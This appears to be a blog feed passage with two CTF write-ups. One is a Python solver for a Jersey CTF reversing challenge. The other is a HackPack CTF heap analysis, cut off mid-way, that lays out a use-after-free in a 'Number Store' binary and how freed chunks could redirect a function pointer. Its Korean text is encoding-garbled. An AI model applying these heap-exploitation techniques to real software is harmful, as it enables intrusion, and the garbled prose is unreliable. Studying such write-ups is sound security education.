          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> remote </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jersey CTF III 2023 - tracer</title>
      <link href="/230418-jerseyctf2023-tracer/"/>
      <url>/230418-jerseyctf2023-tracer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1908">https://ctftime.org/event/1908</a></li></ul><blockquote><p>unknown</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><ul><li></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for ( i = 0; i &lt;= 304; ++i )</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># for ( j = 0; j &lt;= 0x26; ++j )</span></span><br><span class="line">    <span class="comment"># flag[j] = key[j] ^ sbox[(unsigned __int8)flag[j]];</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">FC 55 A8 C7 F5 52 07 B4  25 B0 65 CC 9C 5F C8 90</span></span><br><span class="line"><span class="string">4B 1B 01 05 80 A3 06 D4  47 94 50 32 F9 04 52 58</span></span><br><span class="line"><span class="string">88 31 A5 BD 82 D9 8E 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">flag = [i <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">9A 81 14 C3 E0 CA C0 09  B8 C8 27 7A 5F D7 B1 ED</span></span><br><span class="line"><span class="string">9A 73 1A 8F 8C 04 92 8E  EA 7C 5A BD B1 B4 72 1B</span></span><br><span class="line"><span class="string">2F 3A 76 C6 C9 02 EA 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sbox = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">66 40 3A 55 92 34 EF AA  33 AF 4F B7 0C C9 B8 A4</span></span><br><span class="line"><span class="string">E4 EE FE EC 08 BD DA F1  91 DF 01 AE 75 5A 43 05</span></span><br><span class="line"><span class="string">F2 64 8B BC 61 A3 B6 C8  57 ED 94 98 03 8E AB 7D</span></span><br><span class="line"><span class="string">51 F7 65 CA 76 C5 50 D2  BE CD 1F 1C 26 97 D7 89</span></span><br><span class="line"><span class="string">19 C6 21 99 31 95 67 60  A8 10 7A 5C 53 0B 7C 30</span></span><br><span class="line"><span class="string">32 B2 12 29 CE E2 2E 7B  37 15 56 A1 2D 47 D1 88</span></span><br><span class="line"><span class="string">A5 2A 9B 5D F5 71 85 90  62 E6 D9 D8 11 0D 63 D3</span></span><br><span class="line"><span class="string">07 1A E3 70 24 F4 DC 4B  93 81 6E 8D F9 FD E0 A0</span></span><br><span class="line"><span class="string">73 DB 59 4E 17 87 96 42  BB CF BA 2B EA 44 6A 1D</span></span><br><span class="line"><span class="string">9D 4D 79 B9 BF 5F E9 F0  41 3C 28 6C AC FA 02 1B</span></span><br><span class="line"><span class="string">E1 B0 54 FB 84 D0 22 6F  13 F6 8C DD 52 68 D5 D4</span></span><br><span class="line"><span class="string">58 83 C2 EB E7 6D 18 E5  CC 00 9E FF CB 5B 78 C7</span></span><br><span class="line"><span class="string">2C C1 B1 FC 3F AD 9A A7  B4 5E F3 8F DE C3 14 E8</span></span><br><span class="line"><span class="string">2F 0F 8A 3D 36 49 48 C0  D6 23 04 7F 7E 3B 16 69</span></span><br><span class="line"><span class="string">25 0A A9 09 6B 77 F8 B5  45 A6 1E 06 20 0E 39 38</span></span><br><span class="line"><span class="string">4A 74 B3 4C 27 3E C4 72  86 80 A2 9C 9F 46 82 35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">305</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">39</span>):</span><br><span class="line">        flag[j] = key[j] ^ sbox[flag[j]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag = <span class="built_in">bytes</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jersey </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackPack CTF 2023 - Number Store (UAF)</title>
      <link href="/230417-hackpackctf2023-number_store/"/>
      <url>/230417-hackpackctf2023-number_store/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1893">https://ctftime.org/event/1893</a></li></ul><blockquote><p>Welcome to Number Store(TM)! A new FREE password manager. However, due to budget constraints we were only able to add support for storing numbers. Store your favorite secret numbers or generate new random ones! Also comes with a super secret flag!<br><code>nc cha.hackpack.club 41705</code></p></blockquote><ul><li>[48 solves &#x2F; 116 points]</li></ul><p>ì•„ë§ˆ ì´ ë¸”ë¡œê·¸ ìµœì´ˆ uaf ë¡¸ì—…ì´ì§€ ì•Šë‚˜ ì‹¶ë‹¤. íž™ ë¬¸ì œë¥¼ ê¸°í”¼í–ˆì—ˆëŠ”ë° íƒœê·¸ê°€ easyì—¬ì„œ í’€ì–´ë´¤ë‹¤..<br>ctf ì‹œìž‘í•˜ê³  ë°”ì´ë„ˆë¦¬ë¥¼ ë‹¤ìš´ë°›ê³  ëë‚˜ê³  í’€ì–´ë´¤ëŠ”ë° ì¤‘ê°„ì— ë°”ì´ë„ˆë¦¬ê°€ ë°”ë€Œì—ˆë‹¤. <code>printFlag</code> í•¨ìˆ˜ ì£¼ì†Œë§Œ ë°”ê¿”ì£¼ë‹ˆ remoteë¡œ í”Œëž˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìžˆì–´ì„œ ê·¸ëƒ¥ ì˜ˆì „ ë°”ì´ë„ˆë¦¬ ì½”ë“œë¥¼ ë³´ê² ë‹¤ ã…Ž.. (ì‹¤ì œë¡œ ë¶„ì„ì€ ì˜ˆì „ ë°”ì´ë„ˆë¦¬ë¡œ í–ˆê¸° ë•Œë¬¸..)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì¼ë‹¨ <code>main</code> í•¨ìˆ˜ë¥¼ ì‚´íŽ´ë³´ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> func_result; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> print_idx; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> edit_idx; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> IndexNum; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> UserNum; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  _QWORD *_func_result; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **Number_obj; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *Number_obj_copy; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  Number_obj = (<span class="type">const</span> <span class="type">char</span> **)<span class="built_in">calloc</span>(<span class="number">10uLL</span>, <span class="number">8uLL</span>);<span class="comment">// 8ì§œë¦¬ 10ê°œ</span></span><br><span class="line">  Number_obj_copy = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">10uLL</span>, <span class="number">16uLL</span>);<span class="comment">// 16ì§œë¦¬ 10ê°œ</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">159</span>; i += <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">strncpy</span>(&amp;Number_obj_copy[i], <span class="string">&quot;none&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  _func_result = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  printStr(<span class="string">&quot;WELCOME TO NUMBER STORE\n&quot;</span>);</span><br><span class="line">  printStr(<span class="string">&quot;Store your favorite or secret numbers here! You can even generate new random numbers!\n&quot;</span>);</span><br><span class="line">  printStr(<span class="string">&quot;Now includes a super secret flag!\n\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    printStr(<span class="string">&quot;1.) Store New Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;2.) Delete Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;3.) Edit Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;4.) Show Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;5.) Show Number List\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;6.) Generate Random Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;7.) Show Random Number\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;8.) Show Super Secret Flag\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;9.) Quit\n\n&quot;</span>);</span><br><span class="line">    printStr(<span class="string">&quot;Choose option: &quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)getUserNum() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of new number (0-9): &quot;</span>);</span><br><span class="line">        UserNum = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( UserNum &gt;= <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">goto</span> Index_out_of_bound;</span><br><span class="line">        createStaticNum(UserNum, (__int64)Number_obj);</span><br><span class="line">        <span class="built_in">strncpy</span>(&amp;Number_obj_copy[<span class="number">16</span> * UserNum], Number_obj[UserNum], <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of number to delete (0-9): &quot;</span>);</span><br><span class="line">        IndexNum = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( IndexNum &lt; <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          deleteObject(IndexNum, (__int64)Number_obj);</span><br><span class="line">          <span class="built_in">strncpy</span>(&amp;Number_obj_copy[<span class="number">16</span> * IndexNum], <span class="string">&quot;none&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          printStr(<span class="string">&quot;Invalid Index!\n&quot;</span>);         <span class="comment">// ìŒìˆ˜ ì•ˆë¨ oob x</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Enter index of number to edit (0-9): &quot;</span>);</span><br><span class="line">        edit_idx = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt; <span class="number">0xA</span> )</span><br><span class="line">          editObject(edit_idx, (__int64)Number_obj);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;Invalid Index\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Select index of number to print (0-9): &quot;</span>);</span><br><span class="line">        print_idx = getUserNum();</span><br><span class="line">        <span class="keyword">if</span> ( print_idx &gt;= <span class="number">0xA</span> )</span><br><span class="line">Index_out_of_bound:</span><br><span class="line">          printStr(<span class="string">&quot;Index out of bounds!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          readObject(print_idx, (__int64)Number_obj);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        showList((__int64)Number_obj_copy);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">          _func_result = createRandomNum();</span><br><span class="line">        func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag ì‹¤í–‰í•´ì•¼í•¨</span></span><br><span class="line">        _func_result[<span class="number">1</span>] = *_func_result;</span><br><span class="line">        *_func_result = func_result;</span><br><span class="line">        <span class="keyword">goto</span> print_random_num;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">print_random_num:</span><br><span class="line">        <span class="keyword">if</span> ( _func_result )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *_func_result);       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;No Random Number has been generated\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Access Denied\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Option does not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printStr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( _func_result )</span><br><span class="line">    <span class="built_in">free</span>(_func_result);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;Number_obj_copy[<span class="number">16</span> * j], <span class="string">&quot;none&quot;</span>) )</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)Number_obj[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(Number_obj_copy);</span><br><span class="line">  <span class="built_in">free</span>(Number_obj);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì¼ë‹¨ 1ë²ˆ ë©”ë‰´ë¥¼ ì‚´íŽ´ë³´ìž. <code>createStaticNum</code> í•¨ìˆ˜ì´ë‹¤. ì°¸ê³ ë¡œ ì—¬ëŸ¬ ê¸°ëŠ¥ì„ ì‹¤í–‰í•˜ê¸° ì „ì— <code>getUserNum</code> í•¨ìˆ˜ë¥¼ í†µí•´ ì¸ë±ìŠ¤ë¥¼ ë°›ì•„ì˜¤ëŠ”ë° ìŒìˆ˜ë¥¼ ìž˜ ê±°ë¥´ê³  ìžˆìœ¼ë‹ˆ oobì™€ ê°™ì€ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ì—†ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">createStaticNum</span><span class="params">(<span class="type">int</span> idx, __int64 obj)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *name_ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  name_ptr = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  printStr(<span class="string">&quot;Enter object name: &quot;</span>);</span><br><span class="line">  getName(name_ptr);</span><br><span class="line">  printStr(<span class="string">&quot;Enter number: &quot;</span>);</span><br><span class="line">  name_ptr[<span class="number">2</span>] = getUserNum();</span><br><span class="line">  result = name_ptr;</span><br><span class="line">  *(_QWORD *)(obj + <span class="number">8LL</span> * idx) = name_ptr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>idx</code>ì™€ <code>obj</code>ê°€ ì¸ìžë¡œ ë„˜ì–´ì™”ë‹¤. <code>malloc</code>ì„ í†µí•´ì„œ <code>name</code>ì„ ìž…ë ¥ë°›ëŠ” ê³µê°„ì„ í• ë‹¹í•œë‹¤. ê·¸ëŸ¬ë‹ˆê¹ <code>obj</code>ëŠ” ì•„ëž˜ì²˜ëŸ¼ ìƒê²¼ë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name_ptr + 0x00: name</span><br><span class="line">name_ptr + 0x10: name</span><br><span class="line">name_ptr + 0x18: num</span><br><span class="line">...</span><br><span class="line">obj + 0x00: name_ptr </span><br><span class="line">obj + 0x08: name_ptr A</span><br><span class="line">obj + 0x10: name_ptr B</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ë””ë²„ê¹…í•˜ë©´ì„œ ì²˜ìŒ ì•Œê²Œë˜ì—ˆëŠ”ë° ëŠ¦ê²Œ mallocë˜ë©´ ì£¼ì†Œê°€ ìœ„ë¡œ ì˜¬ë¼ê°„ë‹¤. </p><p>ì´ì œ <code>deleteObject</code> í•¨ìˆ˜ë¥¼ ì‚´íŽ´ë³´ìž.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">deleteObject</span><span class="params">(<span class="type">int</span> idx, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">8LL</span> * idx + a2));             <span class="comment">// freeí•˜ê³  ë‚˜ì„œ ë°ì´í„°ë¥¼ ì´ˆê¸°í™” ì‹œì¼œì¤˜ì•¼í•˜ëŠ”ë° ì•ˆ ì‹œì¼œì¤Œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì£¼ì„ì—ë„ ì í˜€ìžˆë“¯ì´, <code>free</code>í•˜ê³  ë‚˜ì„œ ë°ì´í„°ë„ í•¨ê»˜ ì´ˆê¸°í™” ì‹œì¼œì¤˜ì•¼í•˜ëŠ”ë° ì•ˆ ì‹œì¼œì¤¬ë‹¤. ê·¸ëŸ¬ë©´ ë°ì´í„°ê°€ ê·¸ëŒ€ë¡œ ë‚¨ì•„ìžˆê²Œ ëœë‹¤.</p><ul><li><p>ìž…ë ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createStaticNum(0, &#x27;aaaa&#x27;, 1234)</span><br></pre></td></tr></table></figure></li><li><p>free ì „</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># name_ptr</span><br><span class="line">0x55fa7d9683b0: 0x0000000061616161      0x0000000000000000</span><br><span class="line">0x55fa7d9683c0: 0x00000000000004d2</span><br><span class="line"></span><br><span class="line"># obj</span><br><span class="line">0x55fa7d9682a0: 0x000055fa7d9683b0</span><br></pre></td></tr></table></figure></li><li><p>free í›„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># name_ptr</span><br><span class="line">0x55fa7d9683b0: 0x000000055fa7d968      0x672609a652e683d0</span><br><span class="line">0x55fa7d9683c0: 0x00000000000004d2</span><br><span class="line"></span><br><span class="line"># obj</span><br><span class="line">0x55fa7d9682a0: 0x000055fa7d9683b0</span><br></pre></td></tr></table></figure></li></ul><p><code>name</code> ë¶€ë¶„ì€ ì´ìƒí•´ì¡ŒëŠ”ë°,.. <code>num</code>ì€ ê·¸ëŒ€ë¡œ ë³´ì¡´ë˜ì–´ ìžˆë‹¤. í•´ì œ í›„ì—ë„ ì´ ê°’ì„ ì´ìš©í•  ìˆ˜ ìžˆê¸° ë•Œë¬¸ì— ì´ ê°’ì„ ì´ìš©í•  ê²ƒì´ë‹¤. (int)ë¼ì„œ ì£¼ì†Œ ë„£ê¸° ë”± ì¢‹ì•„ë³´ì¸ë‹¤.</p><p>ì´ì œ ë˜ ë‹¤ë¥¸ <code>malloc</code>ì„ ì°¾ì„ ê²ƒì´ë‹¤. ì™œëƒí•˜ë©´ <code>heap chunk</code>ë¥¼ í•´ì œí•˜ê³  ë˜‘ê°™ì€ í¬ê¸°ì˜ <code>heap chunk</code>ë¥¼ í• ë‹¹í•˜ë©´ ë™ì¼í•œ ìœ„ì¹˜í•œë‹¤ëŠ” ê²ƒì„ ì´ìš©í•  ê²ƒì´ê¸° ë•Œë¬¸ì´ë‹¤. <code>malloc</code>ì„ ì‚¬ìš©í•˜ëŠ” ê³³ì´ ì´ ë‘ ê³³ ìžˆëŠ”ë°, í•˜ë‚˜ëŠ” ìœ„ì˜  <code>createStaticNum</code> í•¨ìˆ˜ì´ê³  ë‹¤ë¥¸ í•˜ë‚˜ëŠ” <code>createRandomNum</code>ì´ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *<span class="title function_">createRandomNum</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  srand(<span class="number">0</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  buf[<span class="number">2</span>] = generateRandNum;                     <span class="comment">// í•¨ìˆ˜ í¬ì¸í„°</span></span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *buf = <span class="number">0LL</span>;</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ êµ¬ì¡°ëŠ” ì•„ëž˜ì™€ ê°™ì´ ìƒê²¼ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf + 0x00: 0</span><br><span class="line">buf + 0x10: 0</span><br><span class="line">buf + 0x18: generateRandNum func_ptr</span><br></pre></td></tr></table></figure><p>ì´ êµ¬ì¡°ëŠ” ë­”ê°€ ì•„ê¹Œ ìœ„ì—ì„œ ë³¸ name_ptrê³¼ ìœ ì‚¬í•˜ë‹¤. ì„œë¡œ ë‹¤ë¥¸ êµ¬ì¡°ì²´ê°€ ìžˆëŠ”ë° ìš©ë„ëŠ” ë‹¤ë¥´ì§€ë§Œ í¬ê¸°ê°€ ë™ì¼í•˜ë‹¤. A ìš©ë„ì—ì„œ í•´ì œí•  ë•Œ ë°ì´í„°ê°€ ì´ˆê¸°í™”ê°€ ë˜ì§€ ì•Šì•„ B ìš©ë„ì¼ ë•Œ ì‚¬ìš©ë  ìˆ˜ 